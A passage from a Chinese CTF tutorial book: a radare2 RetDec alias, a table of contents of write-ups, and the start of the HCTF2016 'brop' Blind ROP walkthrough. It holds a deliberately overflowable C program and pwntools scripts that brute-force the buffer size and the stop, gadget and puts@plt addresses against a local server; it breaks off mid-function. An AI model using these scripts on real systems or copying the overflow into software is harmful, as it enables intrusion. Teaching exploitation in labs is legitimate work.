// Decompilation date: 2017-12-15 07:48:04
每次输入反编译器路径是不是有点烦，在文件 ~/.config/radare2/radare2rc
里配置一下 alias 就好了，用 $decompile 替代：
870
5.11.1 RetDec
# Alias
$decompile=#!pipe node /home/user/r2-scripts/decompiler/decompil
e.js
[0x000003e0]> $decompile -h
Usage: $decompile [-acChps] [-n naming] @ addr
-a: disable selective decompilation (decompile the hole file)
-c: clear comments
-C: save decompilation results in r2 as a comment
-p: produce python code instead of C
-s: silent. Do not display messages
-h: displays this help menu
-n naming: select variable naming
Where valid variable namings are:
readable: Tries to produce as meaningful variable names as pos
sible
address: Variables are named by their addresses in the binary
file
hungarian: Prefix variables with their type
simple: Name variables simply by assigning fruit names
unified: Globals, locals and parameters are named just gX, vX
and aX
****************************************************************
******
This will upload the binary being analyzed to retdec.com !!
!
You have been warned...
****************************************************************
******
参考资料
retdec github
RetDec: An Open-Source Machine-Code Decompiler
871
5.11.1 RetDec
radare r2pipe decompiler
872
六、题解篇
第六章 题解篇
Pwn
6.1.1 pwn HCTF2016 brop
6.1.2 pwn NJCTF2017 pingme
6.1.3 pwn XDCTF2015 pwn200
6.1.4 pwn BackdoorCTF2017 Fun-Signals
6.1.5 pwn GreHackCTF2017 beerfighter
6.1.6 pwn DefconCTF2015 fuckup
6.1.7 pwn 0CTF2015 freenote
6.1.8 pwn DCTF2017 Flex
6.1.9 pwn RHme3 Exploitation
6.1.10 pwn 0CTF2017 BabyHeap2017
6.1.11 pwn 9447CTF2015 Search-Engine
6.1.12 pwn N1CTF2018 vote
6.1.13 pwn 34C3CTF2017 readme_revenge
6.1.14 pwn 32C3CTF2015 readme
6.1.15 pwn 34C3CTF2017 SimpleGC
6.1.16 pwn HITBCTF2017 1000levels
6.1.17 pwn SECCONCTF2016 jmper
6.1.18 pwn HITBCTF2017 Sentosa
6.1.19 pwn HITBCTF2018 gundam
6.1.20 pwn 33C3CTF2016 babyfengshui
6.1.21 pwn HITCONCTF2016 Secret_Holder
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
6.1.23 pwn BCTF2016 bcloud
6.1.24 pwn HITCONCTF2016 House_of_Orange
6.1.25 pwn HCTF2017 babyprintf
6.1.26 pwn 34C3CTF2017 300
6.1.27 pwn SECCONCTF2016 tinypad
6.1.28 pwn ASISCTF2016 b00ks
6.1.29 pwn Insomni'hack_teaserCTF2017 The_Great_Escape_part-3
6.1.30 pwn HITCONCTF2017 Ghost_in_the_heap
6.1.31 pwn HITBCTF2018 mutepig
873
六、题解篇
6.1.32 pwn SECCONCTF2017 vm_no_fun
6.1.33 pwn 34C3CTF2017 LFA
6.2.34 pwn N1CTF2018 memsafety
Reverse
6.2.1 re XHPCTF2017 dont_panic
6.2.2 re ECTF2016 tayy
6.2.3 re CodegateCTF2017 angrybird
6.2.4 re CSAWCTF2015 wyvern
6.2.5 re PicoCTF2014 Baleful
6.2.6 re SECCONCTF2017 printf_machine
6.2.7 re CodegateCTF2018 RedVelvet
6.2.8 re DefcampCTF2015 entry_language
Web
6.3.1 web HCTF2017 babycrack
Crypto
Misc
Mobile
874
6.1.1 pwn HCTF2016 brop
6.1.1 pwn HCTF2016 brop
题目复现
BROP 原理及题目解析
漏洞利用
参考资料
下载文件
题目复现
出题人在 github 上开源了代码，出题人失踪了。如下：
875
6.1.1 pwn HCTF2016 brop
#include 
#include 
#include 
int i;
int check();
int main(void) {
setbuf(stdin, NULL);
setbuf(stdout, NULL);
setbuf(stderr, NULL);
puts("WelCome my friend,Do you know password?");
if(!check()) {
puts("Do not dump my memory");
} else {
puts("No password, no game");
}
}
int check() {
char buf[50];
read(STDIN_FILENO, buf, 1024);
return strcmp(buf, "aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;
flk");
}
使用下面的语句编译，然后运行起来：
$ gcc -z noexecstack -fno-stack-protector -no-pie brop.c
checksec 如下：
876
6.1.1 pwn HCTF2016 brop
$ checksec -f a.out
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO No canary found NX enabled No PIE
No RPATH No RUNPATH No 0 2 a.out
由于 socat 在程序崩溃时会断开连接，我们写一个小脚本，让程序在崩溃后立即重
启，这样就模拟出了远程环境 127.0.0.1:10001 ：
#!/bin/sh
while true; do
num=`ps -ef | grep "socat" | grep -v "grep" | wc -l`
if [ $num -lt 5 ]; then
socat tcp4-listen:10001,reuseaddr,fork exec:./a.
out &
fi
done
在一个单独的 shell 中运行它，这样我们就简单模拟出了比赛时的环境，即仅提供
ip 和端口。（不停地断开重连特别耗CPU，建议在服务器上跑）
BROP 原理及题目解析
BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下，通过 ROP 进行
远程攻击，劫持该应用程序的控制流，可用于开启了 ASLR、NX 和栈 canary 的
64-bit Linux。这一概念是是在 2014 年提出的，论文和幻灯片在参考资料中。
实现这一攻击有两个必要条件：
1. 目标程序存在一个栈溢出漏洞，并且我们知道怎样去触发它
2. 目标进程在崩溃后会立即重启，并且重启后进程被加载的地址不变，这样即使
目标机器开启了 ASLR 也没有影响。
下面我们结合题目来讲一讲。
漏洞利用
877
6.1.1 pwn HCTF2016 brop
栈溢出
首先是要找到栈溢出的漏洞，老办法从 1 个字符开始，暴力枚举，直到它崩溃。
def get_buffer_size():
for i in range(100):
payload = "A"
payload += "A"*i
buf_size = len(payload) - 1
try:
p = remote('127.0.0.1', 10001)
p.recvline()
p.send(payload)
p.recv()
p.close()
log.info("bad: %d" % buf_size)
except EOFError as e:
p.close()
log.info("buffer size: %d" % buf_size)
return buf_size
[*] buffer size: 72
要注意的是，崩溃意味着我们覆盖到了返回地址，所以缓冲区应该是发送的字符数
减一，即 buf(64)+ebp(8)=72。该题并没有开启 canary，所以跳过爆破的过程。
stop gadget
在寻找通用 gadget 之前，我们需要一个 stop gadget。一般情况下，当我们把返回
地址覆盖后，程序有很大的几率会挂掉，因为所覆盖的地址可能并不是合法的，所
以我们需要一个能够使程序正常返回的地址，称作 stop gadget，这一步至关重
要。stop gadget 可能不止一个，这里我们之间返回找到的第一个好了：
878
6.1.1 pwn HCTF2016 brop
def get_stop_addr(buf_size):
addr = 0x400000
while True:
sleep(0.1)
addr += 1
payload = "A"*buf_size
payload += p64(addr)
try:
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
p.recvline()
p.close()
log.info("stop address: 0x%x" % addr)
return addr
except EOFError as e:
p.close()
log.info("bad: 0x%x" % addr)
except:
log.info("Can't connect")
addr -= 1
由于我们在本地的守护脚本略简陋，在程序挂掉和重新启动之间存在一定的时间
差，所以这里 sleep(0.1) 做一定的缓冲，如果还是冲突，在 except 进行处
理，后面的代码也一样。
[*] stop address: 0x4005e5
common gadget
有了 stop gadget，那些原本会导致程序崩溃的地址还是一样会导致崩溃，但那些
正常返回的地址则会通过 stop gadget 进入被挂起的状态。下面我们就可以寻找其
他可利用的 gadget，由于是 64 位程序，可以考虑使用通用 gadget（有关该内容请
参见章节4.7）：
879
6.1.1 pwn HCTF2016 brop
def get_gadgets_addr(buf_size, stop_addr):
addr = stop_addr
while True:
sleep(0.1)
addr += 1
payload = "A"*buf_size
payload += p64(addr)
payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) +
p64(6)
payload += p64(stop_addr)
try:
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
p.recvline()
p.close()
log.info("find address: 0x%x" % addr)
try: # check
payload = "A"*buf_size
payload += p64(addr)
payload += p64(1) + p64(2) + p64(3) + p64(4) + p
64(5) + p64(6)
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
p.recvline()
p.close()
log.info("bad address: 0x%x" % addr)
except:
p.close()
log.info("gadget address: 0x%x" % addr)
return addr
except EOFError as e:
p.close()
log.info("bad: 0x%x" % addr)
except:
log.info("Can't connect")
addr -= 1
880
6.1.1 pwn HCTF2016 brop
直接从 stop gadget 的地方开始搜索就可以了。另外，找到一个正常返回的地址之
后，需要进行检查，以确定是它确实是通用 gadget。
[*] gadget address: 0x40082a
有了通用 gadget，就可以得到 pop rdi; ret 的地址了，即 gadget address +
9。
puts@plt
plt 表具有比较规整的结构，每一个表项都是 16 字节，而在每个表项的 6 字节偏移
处，是该表项对应函数的解析路径，所以先得到 plt 地址，然后 dump 出内存，就
可以找到 got 地址。
这里我们使用 puts 函数来 dump 内存，比起 write，它只需要一个参数，很方便：
881
6.1.1 pwn HCTF2016 brop
def get_puts_plt(buf_size, stop_addr, gadgets_addr):
pop_rdi = gadgets_addr + 9 # pop rdi; ret;
addr = stop_addr
while True:
sleep(0.1)
addr += 1
payload = "A"*buf_size
payload += p64(pop_rdi)
payload += p64(0x400000)
payload += p64(addr)
payload += p64(stop_addr)
try:
p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
if p.recv().startswith("\x7fELF"):